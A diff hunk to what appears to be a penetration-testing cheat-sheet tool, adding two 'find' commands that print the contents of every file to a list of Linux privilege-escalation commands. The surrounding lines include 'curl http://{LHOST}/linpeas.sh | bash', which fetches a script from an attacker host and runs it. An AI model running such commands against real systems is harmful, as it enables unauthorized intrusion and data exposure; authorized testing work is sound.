@@ -253,6 +253,8 @@ EOF
       { cmd: `ss -tulpn`, category: 'linux_priv' },
       { cmd: ``, category: 'linux_priv' },
       { cmd: `# finding manual`, category: 'linux_priv' },
+      { cmd: `find . -type f -exec cat {} \;`, category: 'linux_priv' },
+      { cmd: `find . -type f -exec sh -c 'echo "=== {} ===" && cat {}' \;`, category: 'linux_priv' },
       { cmd: `https://boboaung1337.github.io/xng/#linux-privesc`, category: 'linux_priv' },
       { cmd: ``, category: 'linux_priv' },
       { cmd: `curl http://{LHOST}/linpeas.sh | bash`, category: 'linux_priv' },
